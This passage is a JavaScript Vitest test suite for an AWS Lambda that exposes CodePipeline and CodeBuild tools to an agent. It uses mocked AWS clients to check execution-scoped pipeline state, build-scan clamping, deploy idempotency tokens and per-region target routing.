/**
 * TEAM-3822 — pipeline-tools Lambda regression suite (first test file for this
 * Lambda).
 *
 * Drives the REAL `handler` export with the three AWS SDK clients mocked at the
 * module seam (same vi.mock + vi.hoisted shape as
 * lambda/orchestrator/agent-invoker-retry.test.mjs), so the execution-scoped
 * get_state race fix, the get_build_status scan clamp, and the start_deploy
 * idempotency token are all exercised end-to-end with no AWS and no
 * credentials.
 *
 * Pinned defects:
 *  1. get_state computed terminal/succeeded from ALL stageStates, so right
 *     after start_deploy a poll could read the PREVIOUS execution's all-green
 *     stages as the new run's completion. Now: execution_id scopes the
 *     computation and matchesExecution:false forces terminal:false.
 *  2. get_build_status's `Math.min(Number(args.scan) || 15, 50)` let a negative
 *     scan invert ids.slice(0, n) into a from-end slice (dropping the NEWEST
 *     builds). Now: integer clamp to [1, 50], non-numeric → 15.
 *  3. start_deploy sent no clientRequestToken, so a retried tool call
 *     double-triggered the pipeline. Now: commit_sha derives a charset/length-
 *     valid token; no sha → token OMITTED (never empty/invalid).
 *  4. (TEAM-3871) Scoped get_state declared terminal:true when only a PREFIX
 *     of stages had reached the new execution (Source done, Build not started),
 *     and stale action statuses from the previous run bled into the scoped
 *     verdict. Now: terminal requires a whole-pipeline disposition (all stages
 *     match, or a matching stage Failed/Stopped), scoped status is stage-level
 *     only, and execution_id is String()-coerced.
 *
 * TEAM-4122 FR-4 adds start_ci_build + capabilities. Those tests assert the
 * SHAPE OF THE REQUEST, not just the answer: the StartBuild input is deep-equal
 * to a three-key allow-list, because every defect this tool could have is a key
 * that reached CodeBuild — an override that replaces the buildspec, or a project
 * name that came from an agent's args instead of from env.
 *
 * TEAM-4337 makes the CD registry the runtime allow-list, so the mocks now
 * record WHICH CLIENT a command went to, not just which command was sent:
 *  - the S3 mock is KEY-AWARE (config/cd-registry.json vs the handoff marker),
 *  - the CodePipeline/CodeBuild/Logs mocks capture their constructor region and
 *    tag every recorded call with it.
 * Multi-target tests therefore assert two things a single-target suite could
 * not: that a request reached the RIGHT REGION, and that a refusal reached no
 * AWS client at all. Section 8 holds them; every mock addition is additive, so
 * sections 1-7 read `.type`/`.input` exactly as before.
 *
 * TEAM-4348 (code review of TEAM-4337/4338) closes three places where the
 * RESOLVED target and the resource actually touched could diverge:
 *  5. get_build_log fell back to the resolved target (`|| target`) when the
 *     project parsed out of build_id was not any target's, so an unregistered
 *     build_id project still drove BatchGetBuilds + GetLogEvents. Now:
 *     project_not_registered, zero AWS calls; a disagreeing args.project +
 *     build_id project is project_mismatch, also zero AWS calls.
 *  6. resolveTarget resolved args.project BEFORE the requirePipelineName
 *     check, so start_deploy({project, commit_sha}) could start a pipeline
 *     execution without ever passing pipeline_name. Now: the project branch is
 *     skipped entirely for requirePipelineName calls.
 *  7. start_ci_build and get_build_status built their clients from the
 *     pipeline_name-resolved target while the project came from elsewhere, so
 *     a cross-region call reached the wrong region. Now: region follows the
 *     project's OWNER, and get_build_status allow-lists its project too.
 *
 * TEAM-4448 D2 gives start_ci_build a bounded RETRY: one extra build per SHA, and
 * only when the newest prior build died in an infra phase. The suite for it pins
 * the DECISION, not just the answer — for every case, how many StartBuild calls
 * happened (usually zero) and which idempotencyToken they carried, because the two
 * ways this feature fails are an unbounded retry loop (the cap not holding) and a
 * retry that collides with a concurrent caller (the token or sourceVersion being
 * derived from args instead of from the prior build — SR-3.2). It also tightens
 * three pre-D2 cases on purpose, each labelled at its assertion.
 *
 * TEAM-4462 F2 fixes the ledger's blind spot: it keyed on resolvedSourceVersion, which
 * CodeBuild only sets once the ref is RESOLVED, so PROVISIONING/DOWNLOAD_SOURCE deaths —
 * two of the four phases D2 treats as retryable — were invisible and the cap could not
 * hold for them. Section (r) covers it, and the diedAt() fixture no longer hard-codes
 * resolvedSourceVersion: it derives the key from the phase, so the two pre-existing
 * PROVISIONING/DOWNLOAD_SOURCE cases now pass because of the FIX rather than because the
 * fixture asserted the code's own assumption.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";
// Section 8.10 asserts on the SOURCE of index.mjs, not on its behaviour: no
// runtime test can prove an approval path is absent from every code path.
import { readFile, readdir } from "node:fs/promises";

/** NoSuchKey, the way S3 raises it — the default for BOTH mocked keys. */
function noSuchKey() {
  const err = new Error("NoSuchKey");
  err.name = "NoSuchKey";
  return err;
}

const h = vi.hoisted(() => ({
  // The S3 key the Lambda reads the CD registry from. Hoisted so the key-aware
  // S3 mock factory can see it (mock factories run before top-level consts).
  CD_REGISTRY_KEY: "config/cd-registry.json",
  state: {
    cpCalls: [], // { region, name, type, input } for every CodePipeline command sent
    cbCalls: [], // { region, name, type, input } for every CodeBuild command sent
    logsCalls: [], // { region, name, type, input } for every Logs command sent
    stsCalls: [], // { region, input } for every STS AssumeRole (cross-account only)
    clientInits: [], // { kind, region, hasCreds } for every AWS client CONSTRUCTED
    // Cross-account: the temp creds AssumeRole hands back. The cp/cb/logs mocks
    // resolve their `credentials` provider in send() (a real client would, when
    // signing), so a cross-account tool call actually reaches this stub.
    assumeRoleImpl: async () => ({
      Credentials: {
        AccessKeyId: "ASIA-XACCT",
        SecretAccessKey: "secret",
        SessionToken: "token",
        Expiration: new Date(Date.now() + 900_000),
      },
    }),
    getPipelineStateImpl: async () => ({ stageStates: [] }),
    listActionExecutionsImpl: async () => ({ actionExecutionDetails: [] }),
    startPipelineExecutionImpl: async () => ({ pipelineExecutionId: "exec-new" }),
    getPipelineExecutionImpl: async () => ({ pipelineExecution: { artifactRevisions: [] } }),
    s3Calls: [], // the input of every S3 command, reads and writes alike
    // TEAM-4525: PutObject only, with the CLIENT REGION it was sent on — the
    // ship-approval record must always be written by this Lambda's own ambient S3
    // client against the HUB's bucket, never by a cross-account target's assumed
    // role in the target's region.
    s3Puts: [], // { region, input }
    putObjectImpl: async () => ({}),
    // TEAM-4525 review P1: the GitHub API calls that prove commit_sha really is
    // approved_head_sha's merge. { url, headers } per call; githubImpl answers.
    githubCalls: [],
    githubImpl: async () => ({ ok: false, status: 404, json: async () => ({}) }),
    // config/cd-registry.json. Default NoSuchKey = "no registry" = env target only,
    // which is what every pre-TEAM-4337 test assumes.
    registryImpl: async () => {
      const err = new Error("NoSuchKey");
      err.name = "NoSuchKey";
      throw err;
    },
    // Every other key (the handoff marker).
    getObjectImpl: async () => {
      const err = new Error("NoSuchKey");
      err.name = "NoSuchKey";
      throw err;
    },
    getLogEventsImpl: async () => ({ events: [] }),
    listBuildsImpl: async () => ({ ids: [] }),
    startBuildImpl: async () => ({
      build: {
        id: "agentcore-hub-ci:11111111-2222-3333-4444-555555555555",
        arn: "arn:aws:codebuild:us-east-1:111122223333:build/agentcore-hub-ci:11111111",
        buildStatus: "IN_PROGRESS",
        resolvedSourceVersion: undefined,
      },
    }),
    batchGetBuildsImpl: async (input) => ({
      builds: (input.ids || []).map((id) => ({
        id,
        buildStatus: "SUCCEEDED",
        resolvedSourceVersion: `sha-${id}`,
        sourceVersion: `pr/${id}`,
        endTime: "2026-01-01T00:00:00Z",
      })),
    }),
  },
}));

vi.mock("@aws-sdk/client-codepipeline", () => ({
  CodePipelineClient: class {
    constructor(cfg) {
      this.region = cfg?.region;
      this.credentials = cfg?.credentials;
      h.state.clientInits.push({ kind: "codepipeline", region: cfg?.region, hasCreds: typeof cfg?.credentials === "function" });
    }
    async send(cmd) {
      if (typeof this.credentials === "function") await this.credentials();
      const type = cmd?.__type;
      h.state.cpCalls.push({
        region: this.region,
        name: cmd.input?.name ?? cmd.input?.pipelineName ?? null,
        type,
        input: cmd.input,
      });
      if (type === "GetPipelineState") return h.state.getPipelineStateImpl(cmd.input);
      if (type === "ListActionExecutions") return h.state.listActionExecutionsImpl(cmd.input);
      if (type === "StartPipelineExecution") return h.state.startPipelineExecutionImpl(cmd.input);
      if (type === "GetPipelineExecution") return h.state.getPipelineExecutionImpl(cmd.input);
      return {};
    }
  },
  GetPipelineStateCommand: class { constructor(i) { this.input = i; this.__type = "GetPipelineState"; } },
  GetPipelineExecutionCommand: class { constructor(i) { this.input = i; this.__type = "GetPipelineExecution"; } },
  StartPipelineExecutionCommand: class { constructor(i) { this.input = i; this.__type = "StartPipelineExecution"; } },
  ListActionExecutionsCommand: class { constructor(i) { this.input = i; this.__type = "ListActionExecutions"; } },
}));

vi.mock("@aws-sdk/client-codebuild", () => ({
  CodeBuildClient: class {
    constructor(cfg) {
      this.region = cfg?.region;
      this.credentials = cfg?.credentials;
      h.state.clientInits.push({ kind: "codebuild", region: cfg?.region, hasCreds: typeof cfg?.credentials === "function" });
    }
    async send(cmd) {
      if (typeof this.credentials === "function") await this.credentials();
      const type = cmd?.__type;
      h.state.cbCalls.push({
        region: this.region,
        name: cmd.input?.projectName ?? null,
        type,
        input: cmd.input,
      });
      if (type === "ListBuildsForProject") return h.state.listBuildsImpl(cmd.input);
      if (type === "BatchGetBuilds") return h.state.batchGetBuildsImpl(cmd.input);
      if (type === "StartBuild") return h.state.startBuildImpl(cmd.input);
      return {};
    }
  },
  ListBuildsForProjectCommand: class { constructor(i) { this.input = i; this.__type = "ListBuildsForProject"; } },
  BatchGetBuildsCommand: class { constructor(i) { this.input = i; this.__type = "BatchGetBuilds"; } },
  StartBuildCommand: class { constructor(i) { this.input = i; this.__type = "StartBuild"; } },
}));

vi.mock("@aws-sdk/client-s3", () => ({
  S3Client: class {
    constructor(cfg) {
      this.region = cfg?.region;
      h.state.clientInits.push({ kind: "s3", region: cfg?.region });
    }
    async send(cmd) {
      h.state.s3Calls.push(cmd.input);
      // TYPE-aware first (a PutObject's Key is never the registry's), then
      // KEY-AWARE: the CD registry and the handoff marker share one bucket and
      // one client, so only the Key distinguishes them. Keeping every command in
      // s3Calls preserves the existing `.at(-1)` and `toEqual([])` assertions.
      if (cmd.__type === "PutObject") {
        h.state.s3Puts.push({ region: this.region, input: cmd.input });
        return h.state.putObjectImpl(cmd.input);
      }
      if (cmd.input?.Key === h.CD_REGISTRY_KEY) return h.state.registryImpl(cmd.input);
      return h.state.getObjectImpl(cmd.input);
    }
  },
  GetObjectCommand: class { constructor(i) { this.input = i; this.__type = "GetObject"; } },
  PutObjectCommand: class { constructor(i) { this.input = i; this.__type = "PutObject"; } },
}));

vi.mock("@aws-sdk/client-cloudwatch-logs", () => ({
  CloudWatchLogsClient: class {
    constructor(cfg) {
      this.region = cfg?.region;
      this.credentials = cfg?.credentials;
      h.state.clientInits.push({ kind: "logs", region: cfg?.region, hasCreds: typeof cfg?.credentials === "function" });
    }
    async send(cmd) {
      if (typeof this.credentials === "function") await this.credentials();
      h.state.logsCalls.push({
        region: this.region,
        name: cmd.input?.logGroupName ?? null,
        type: "GetLogEvents",
        input: cmd.input,
      });
      return h.state.getLogEventsImpl(cmd.input);
    }
  },
  GetLogEventsCommand: class { constructor(i) { this.input = i; } },
}));

// Cross-account only: the assume-role provider clientsFor() wires onto a
// cross-account target's clients calls this. Records every AssumeRole so a test
// can assert the RoleArn + ExternalId that reached STS (the confused-deputy
// guard), and that a same-account call never touches it.
vi.mock("@aws-sdk/client-sts", () => ({
  STSClient: class {
    constructor(cfg) {
      this.region = cfg?.region;
    }
    async send(cmd) {
      h.state.stsCalls.push({ region: this.region, input: cmd.input });
      return h.state.assumeRoleImpl(cmd.input);
    }
  },
  AssumeRoleCommand: class { constructor(i) { this.input = i; } },
}));

const { handler, validateCiProjectName, classifyPriorBuild } = await import("./index.mjs");

/** The hoisted default BatchGetBuilds stub, so a suite that installs its own can
 * be restored between tests. */
const DEFAULT_BATCH_GET = h.state.batchGetBuildsImpl;

/** Invoke the handler the way the runtime's _invoke_lambda does and parse the
 * jsonResult text payload back into an object. */
async function invoke(tool, args = {}) {
  const res = await handler({ name: `Pipeline___${tool}`, arguments: args });
  return JSON.parse(res.content[0].text);
}

/** A GetPipelineState response where every stage is green and belongs to
 * `executionId`. */
function allGreenStages(executionId) {
  return {
    stageStates: ["Source", "Build", "Deploy"].map((stageName) => ({
      stageName,
      latestExecution: { status: "Succeeded", pipelineExecutionId: executionId },
      actionStates: [
        {
          actionName: `${stageName}_action`,
          latestExecution: { status: "Succeeded" },
        },
      ],
    })),
  };
}

/** Invoke a specific handler instance (see withEnv) the same way. */
async function invokeOn(handlerFn, tool, args = {}) {
  const res = await handlerFn({ name: `Pipeline___${tool}`, arguments: args });
  return JSON.parse(res.content[0].text);
}

/**
 * Re-import index.mjs with `env` applied, for the values it reads ONCE at module
 * load (CI_PROJECT and its validation verdict). The AWS mocks are re-created by
 * vitest but still close over this file's `h`, so calls land in h.state as usual.
 * Env and the module registry are both restored afterwards, so the top-level
 * `handler` other suites use is untouched.
 */
async function withEnv(env, fn) {
  const saved = Object.fromEntries(Object.keys(env).map((k) => [k, process.env[k]]));
  for (const [k, v] of Object.entries(env)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  vi.resetModules();
  try {
    const mod = await import("./index.mjs");
    return await fn(mod);
  } finally {
    for (const [k, v] of Object.entries(saved)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
    vi.resetModules();
  }
}

const DEFAULT_START_BUILD = () => ({
  build: {
    id: "agentcore-hub-ci:11111111-2222-3333-4444-555555555555",
    arn: "arn:aws:codebuild:us-east-1:111122223333:build/agentcore-hub-ci:11111111",
    buildStatus: "IN_PROGRESS",
  },
});

// ─── TEAM-4337 multi-target fixtures + helpers ───────────────────────────────

/**
 * Two pipelines in two regions plus a DEPLOY.md-mode CD repo (no pipeline, so
 * pipelineProjects() yields nothing and it must NOT become a target). The first
 * entry deliberately names the env default pipeline, so the env target is
 * de-duplicated rather than appended — targets are exactly these two.
 */
const MULTI_REGISTRY = {
  version: 1,
  repos: [
    { repo: "tycenjmccann/agentcore-hub", pipeline: "agentcore-hub-deploy", region: "us-east-1" },
    { repo: "acme/widget", pipeline: "hub-widget-deploy", region: "us-west-2" },
    { repo: "acme/legacy", deployDoc: "docs/DEPLOY.md" },
  ],
};

/**
 * TEAM-4358 F1 — the same two targets as MULTI_REGISTRY with the hub entry
 * SECOND. Registry ORDER must not decide which target an unqualified call acts
 * on; only PIPELINE_NAME does. Pre-fix, `isEnvDefault` was stamped false on every
 * registry entry, so no target carried it and resolveTarget fell to `targets[0]`
 * — routing every unqualified read AND start_ci_build below to hub-widget-* in
 * us-west-2.
 */
const HUB_SECOND_REGISTRY = {
  version: 1,
  repos: [
    { repo: "acme/widget", pipeline: "hub-widget-deploy", region: "us-west-2" },
    { repo: "tycenjmccann/agentcore-hub", pipeline: "agentcore-hub-deploy", region: "us-east-1" },
  ],
};

/** Serve `doc` (object or raw string) for the registry key. */
function serveRegistry(doc) {
  h.state.registryImpl = async () => ({
    Body: {
      transformToString: async () => (typeof doc === "string" ? doc : JSON.stringify(doc)),
    },
  });
}

/**
 * A fresh module instance whose CD registry is `doc`.
 *
 * The registry is fetched per invocation but CACHED in module scope, so a test
 * that needs a different registry must re-import — which is exactly what
 * withEnv's vi.resetModules() gives us. There is deliberately no test-only
 * reset export on index.mjs.
 *
 * Client constructions and S3 calls made while the module was loading are
 * discarded, so a test can assert exactly what ONE INVOCATION touched.
 */
async function withRegistry(doc, fn, env = {}) {
  if (doc !== null) serveRegistry(doc);
  return withEnv({ ARTIFACT_BUCKET: "hub-artifacts-test", ...env }, async (mod) => {
    h.state.clientInits = [];
    h.state.s3Calls = [];
    h.state.s3Puts = [];
    h.state.stsCalls = [];
    return fn(mod);
  });
}

/** Regions of every client of `kind` constructed since the last reset. */
function initRegions(kind) {
  return h.state.clientInits.filter((c) => c.kind === kind).map((c) => c.region);
}

beforeEach(() => {
  h.state.cpCalls = [];
  h.state.cbCalls = [];
  h.state.logsCalls = [];
  h.state.stsCalls = [];
  h.state.clientInits = [];
  h.state.assumeRoleImpl = async () => ({
    Credentials: {
      AccessKeyId: "ASIA-XACCT",
      SecretAccessKey: "secret",
      SessionToken: "token",
      Expiration: new Date(Date.now() + 900_000),
    },
  });
  // Back to "no registry", so the shared top-level `handler` resolves the env
  // default target and every pre-TEAM-4337 suite behaves exactly as before.
  h.state.registryImpl = async () => {
    throw noSuchKey();
  };
  h.state.getLogEventsImpl = async () => ({ events: [] });
  h.state.getPipelineStateImpl = async () => ({ stageStates: [] });
  h.state.listActionExecutionsImpl = async () => ({ actionExecutionDetails: [] });
  h.state.startPipelineExecutionImpl = async () => ({ pipelineExecutionId: "exec-new" });
  h.state.getPipelineExecutionImpl = async () => ({
    pipelineExecution: { artifactRevisions: [] },
  });
  h.state.s3Calls = [];
  h.state.s3Puts = [];
  h.state.putObjectImpl = async () => ({});
  h.state.getObjectImpl = async () => {
    const err = new Error("NoSuchKey");
    err.name = "NoSuchKey";
    throw err;
  };
  h.state.listBuildsImpl = async () => ({ ids: [] });
  h.state.batchGetBuildsImpl = DEFAULT_BATCH_GET;
  h.state.startBuildImpl = async () => DEFAULT_START_BUILD();
  h.state.githubCalls = [];
  // TEAM-4525 review P1: no test may reach the real GitHub. The default REFUSES,
  // so a suite that forgets to stub the merge binding gets fail-closed behaviour
  // (no record) rather than a network call or an accidental pass.
  h.state.githubImpl = async () => ({ ok: false, status: 404, json: async () => ({}) });
  delete process.env.PIPELINE_CI_START_BUILD;
});

// The Lambda verifies the merge binding with global fetch (nodejs20.x). Stub it
// once, here, for the whole file: every call is recorded on h.state.githubCalls so
// tests can assert WHICH url was fetched and with what auth, and h.state.githubImpl
// decides the answer.
vi.stubGlobal("fetch", async (url, init) => {
  h.state.githubCalls.push({ url: String(url), headers: init?.headers || {} });
  return h.state.githubImpl(String(url), init);
});

// ─── 1. Execution-scoped get_state ───────────────────────────────────────────

describe("get_state execution scoping (the post-start_deploy race)", () => {
  it("does NOT report the OLD run's all-green stages as terminal for a NEW execution_id", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("OLD");

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(false);
    expect(out.terminal).not.toBe(true);
    expect(out.succeeded).not.toBe(true);
  });

  it("matchesExecution:true + terminal:false while a matching stage is InProgress", async () => {
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Source",
          latestExecution: { status: "InProgress", pipelineExecutionId: "NEW" },
          actionStates: [
            { actionName: "GitHub_main", latestExecution: { status: "InProgress" } },
          ],
        },
        {
          stageName: "Build",
          latestExecution: { status: "Succeeded", pipelineExecutionId: "OLD" },
          actionStates: [
            { actionName: "Build_and_gate", latestExecution: { status: "Succeeded" } },
          ],
        },
      ],
    });

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(true);
    expect(out.terminal).toBe(false);
    expect(out.succeeded).toBe(false);
  });

  it("matchesExecution:true + terminal/succeeded once the matching stages are all green", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("NEW");

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(true);
    expect(out.terminal).toBe(true);
    expect(out.succeeded).toBe(true);
    expect(out.failed).toBe(false);
  });

  it("scopes failure detection to the matching execution only", async () => {
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Source",
          latestExecution: { status: "Failed", pipelineExecutionId: "OLD" },
          actionStates: [],
        },
        {
          stageName: "Build",
          latestExecution: { status: "Succeeded", pipelineExecutionId: "NEW" },
          actionStates: [],
        },
      ],
    });

    const out = await invoke("get_state", { execution_id: "NEW" });

    // The OLD run's failure must not bleed into the NEW run's verdict — but a
    // partial match with no matching failure is NOT terminal either (TEAM-3871:
    // terminal requires the WHOLE pipeline to have a disposition for this run).
    expect(out.matchesExecution).toBe(true);
    expect(out.failed).toBe(false);
    expect(out.terminal).toBe(false);
    expect(out.succeeded).toBe(false);
  });

  // ── TEAM-3871 regressions ──────────────────────────────────────────────────

  it("a prefix of stages Succeeded on NEW + later stages still on OLD → terminal:false (transition window)", async () => {
    // The Source→Build handoff window: Source already flipped to NEW and
    // Succeeded, but Build/Deploy still show the OLD run. Nothing is
    // InProgress, yet the NEW run is provably NOT done — Build hasn't started.
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Source",
          latestExecution: { status: "Succeeded", pipelineExecutionId: "NEW" },
          actionStates: [
            { actionName: "GitHub_main", latestExecution: { status: "Succeeded" } },
          ],
        },
        {
          stageName: "Build",
          latestExecution: { status: "Succeeded", pipelineExecutionId: "OLD" },
          actionStates: [
            { actionName: "Build_and_gate", latestExecution: { status: "Succeeded" } },
          ],
        },
        {
          stageName: "Deploy",
          latestExecution: { status: "Succeeded", pipelineExecutionId: "OLD" },
          actionStates: [
            { actionName: "Deploy_action", latestExecution: { status: "Succeeded" } },
          ],
        },
      ],
    });

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(true);
    expect(out.terminal).toBe(false);
    expect(out.succeeded).toBe(false);
    expect(out.failed).toBe(false);
  });

  it("a matching stage Failed → terminal:true + failed:true even with later stages still on OLD", async () => {
    // A failure disposition on the requested execution IS terminal — the run
    // will never advance past the failed stage, so waiting for the remaining
    // stages to "catch up" would poll forever.
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Source",
          latestExecution: { status: "Failed", pipelineExecutionId: "NEW" },
          actionStates: [],
        },
        {
          stageName: "Build",
          latestExecution: { status: "Succeeded", pipelineExecutionId: "OLD" },
          actionStates: [],
        },
      ],
    });

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(true);
    expect(out.terminal).toBe(true);
    expect(out.failed).toBe(true);
    expect(out.succeeded).toBe(false);
  });

  it("stale Failed action inside a matching InProgress stage does NOT mark the run failed", async () => {
    // actionStates carry no execution id: a lingering Failed action from the
    // PREVIOUS run can sit inside a stage whose latestExecution already matches
    // the NEW id. Scoped status must come from the STAGE level only.
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Build",
          latestExecution: { status: "InProgress", pipelineExecutionId: "NEW" },
          actionStates: [
            { actionName: "Build_and_gate", latestExecution: { status: "Failed" } },
          ],
        },
      ],
    });

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(true);
    expect(out.failed).toBe(false);
    expect(out.terminal).toBe(false);
    expect(out.succeeded).toBe(false);
  });

  it("stale InProgress action inside all-green matching stages does NOT block terminal on the scoped path", async () => {
    h.state.getPipelineStateImpl = async () => {
      const state = allGreenStages("NEW");
      state.stageStates[1].actionStates.push({
        actionName: "stale_leftover",
        latestExecution: { status: "InProgress" },
      });
      return state;
    };

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(true);
    expect(out.terminal).toBe(true);
    expect(out.succeeded).toBe(true);
    expect(out.failed).toBe(false);
  });

  it("a numeric execution_id does not throw and behaves like its string form", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("123");

    const asNumber = await invoke("get_state", { execution_id: 123 });
    const asString = await invoke("get_state", { execution_id: "123" });

    expect(asNumber.matchesExecution).toBe(true);
    expect(asNumber.terminal).toBe(true);
    expect(asNumber.succeeded).toBe(true);
    expect(asNumber).toEqual(asString);
  });

  it("back-compat: omitted execution_id keeps today's unscoped behavior", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("OLD");

    const out = await invoke("get_state", {});

    expect(out.terminal).toBe(true);
    expect(out.succeeded).toBe(true);
    expect(out.failed).toBe(false);
    // matchesExecution is an execution-scoped concept — absent without the arg.
    expect(out).not.toHaveProperty("matchesExecution");
  });

  it("back-compat: omitted execution_id still honors ACTION-level statuses", async () => {
    // The unscoped path keeps its pre-TEAM-3871 behavior byte-for-byte: an
    // InProgress or Failed action counts even when the stage status disagrees.
    h.state.getPipelineStateImpl = async () => {
      const state = allGreenStages("OLD");
      state.stageStates[1].actionStates.push({
        actionName: "lagging_action",
        latestExecution: { status: "InProgress" },
      });
      return state;
    };

    const out = await invoke("get_state", {});

    expect(out.terminal).toBe(false);
    expect(out.succeeded).toBe(false);
  });
});

// ─── 2. get_build_status scan clamping ───────────────────────────────────────

describe("get_build_status scan clamping", () => {
  const twenty = Array.from({ length: 20 }, (_, i) => `build-${i}`); // newest first

  beforeEach(() => {
    h.state.listBuildsImpl = async () => ({ ids: [...twenty] });
  });

  /** Returns the ids get_build_status actually looked up via BatchGetBuilds. */
  async function scannedIds(scan) {
    h.state.cbCalls = [];
    await invoke("get_build_status", { scan });
    const batch = h.state.cbCalls.find((c) => c.type === "BatchGetBuilds");
    return batch ? batch.input.ids : [];
  }

  it("negative scan clamps to 1 (never a from-end slice dropping the newest builds)", async () => {
    const ids = await scannedIds(-5);
    expect(ids).toEqual(["build-0"]); // the NEWEST build, not the 15 oldest
    expect(ids.length).toBe(1);
  });

  it("scan 0 clamps to 1 (never an empty scan)", async () => {
    const ids = await scannedIds(0);
    expect(ids).toEqual(["build-0"]);
  });

  it("oversized scan clamps to 50", async () => {
    h.state.listBuildsImpl = async () => ({
      ids: Array.from({ length: 60 }, (_, i) => `build-${i}`),
    });
    const ids = await scannedIds(999);
    expect(ids.length).toBe(50);
    expect(ids[0]).toBe("build-0");
    expect(ids[49]).toBe("build-49");
  });

  it("non-numeric scan falls back to the default 15", async () => {
    const ids = await scannedIds("abc");
    expect(ids.length).toBe(15);
    expect(ids[0]).toBe("build-0");
  });

  it("in-range scan is honored as-is (back-compat)", async () => {
    const ids = await scannedIds(3);
    expect(ids).toEqual(["build-0", "build-1", "build-2"]);
  });
});

// ─── 2b. get_build_status newest-match ordering (TEAM-4466 F-3) ───────────────
// `match` is what the CI agent's verdict is computed from, so which of a SHA's
// builds it names has to come from the newest-first `ids` list — not from the
// order AWS happened to answer BatchGetBuilds in. With TEAM-4448 D2's one-retry
// ledger the two-builds-per-SHA case is now NORMAL, so a response-order read
// reports the FAILED first attempt for a SHA whose retry is green.

describe("get_build_status newest-match ordering (TEAM-4466 F-3)", () => {
  const SHA = "0949f9d8814aa3e2b1c4d5f6a7b8c9d0e1f2a3b4";

  /** ids newest-first; BatchGetBuilds answers in the REVERSE (oldest-first) order. */
  function ledgerReversed(rows) {
    h.state.listBuildsImpl = async () => ({ ids: rows.map((r) => r.id) });
    h.state.batchGetBuildsImpl = async (input) => ({
      builds: [...rows].reverse().filter((r) => input.ids.includes(r.id)),
    });
  }

  it("a green D2 retry above a FAILED first attempt certifies the SHA even when BatchGetBuilds answers oldest-first", async () => {
    ledgerReversed([
      { id: "b-retry", buildStatus: "SUCCEEDED", resolvedSourceVersion: SHA,
        endTime: "2026-01-01T00:10:00Z" },
      // phases are unread by get_build_status; they pin WHICH build this is.
      { id: "b-first", buildStatus: "FAILED", resolvedSourceVersion: SHA,
        endTime: "2026-01-01T00:05:00Z",
        phases: [{ phaseType: "INSTALL", phaseStatus: "FAILED" }] },
    ]);

    const out = await invoke("get_build_status", { commit_sha: SHA });

    expect(out.match.buildId).toBe("b-retry");
    expect(out.match.buildStatus).toBe("SUCCEEDED");
    expect(out.succeededForCommit).toBe(true);
    // rows follow `ids`, not the response array.
    expect(out.builds.map((r) => r.buildId)).toEqual(["b-retry", "b-first"]);
    // The fix reorders; it does not reshape.
    expect(Object.keys(out).sort()).toEqual([
      "builds", "match", "project", "region", "requestedCommit", "succeededForCommit",
    ]);
  });

  it("a retry that also FAILED is the build match names, not the older first attempt", async () => {
    ledgerReversed([
      { id: "b-retry", buildStatus: "FAILED", resolvedSourceVersion: SHA,
        endTime: "2026-01-01T00:10:00Z",
        phases: [{ phaseType: "BUILD", phaseStatus: "FAILED" }] },
      { id: "b-first", buildStatus: "FAILED", resolvedSourceVersion: SHA,
        endTime: "2026-01-01T00:05:00Z",
        phases: [{ phaseType: "INSTALL", phaseStatus: "FAILED" }] },
    ]);

    const out = await invoke("get_build_status", { commit_sha: SHA });

    // Both are red, so succeededForCommit is false either way — but `buildId` is
    // what the agent feeds get_build_log to classify per P2a, and classifying the
    // spent INSTALL flake instead of the real BUILD failure is the wrong verdict.
    expect(out.match.buildId).toBe("b-retry");
    expect(out.match.buildStatus).toBe("FAILED");
    expect(out.succeededForCommit).toBe(false);
    expect(out.builds.map((r) => r.buildId)).toEqual(["b-retry", "b-first"]);
  });
});

// ─── 3. start_deploy idempotency token ───────────────────────────────────────

describe("start_deploy clientRequestToken idempotency", () => {
  function startCall() {
    return h.state.cpCalls.find((c) => c.type === "StartPipelineExecution");
  }

  it("derives a charset/length-valid token from commit_sha", async () => {
    const out = await invoke("start_deploy", { commit_sha: "abc123def" });

    const call = startCall();
    expect(call).toBeDefined();
    const token = call.input.clientRequestToken;
    expect(token).toMatch(/^[a-zA-Z0-9-]+$/);
    expect(token.length).toBeGreaterThanOrEqual(1);
    expect(token.length).toBeLessThanOrEqual(128);
    expect(token).toContain("abc123def");
    expect(out.started).toBe(true);
    expect(out.pipelineExecutionId).toBe("exec-new");
  });

  it("sanitizes a dirty sha to the allowed charset", async () => {
    await invoke("start_deploy", { commit_sha: "abc/123+z" });

    const token = startCall().input.clientRequestToken;
    expect(token).toMatch(/^[a-zA-Z0-9-]+$/);
    expect(token).toContain("abc123z");
  });

  it("clamps the token to 128 chars", async () => {
    await invoke("start_deploy", { commit_sha: "a".repeat(500) });

    const token = startCall().input.clientRequestToken;
    expect(token).toMatch(/^[a-zA-Z0-9-]+$/);
    expect(token.length).toBe(128);
  });

  it("OMITS clientRequestToken entirely when no commit_sha is given", async () => {
    await invoke("start_deploy", {});

    const call = startCall();
    expect(call).toBeDefined();
    expect(call.input).not.toHaveProperty("clientRequestToken");
  });

  it("OMITS clientRequestToken when the sanitized sha is empty (never sends an invalid token)", async () => {
    await invoke("start_deploy", { commit_sha: "///+++" });

    expect(startCall().input).not.toHaveProperty("clientRequestToken");
  });
});

// ─── 3b. start_deploy ship-approval record (TEAM-4525) ───────────────────────
//
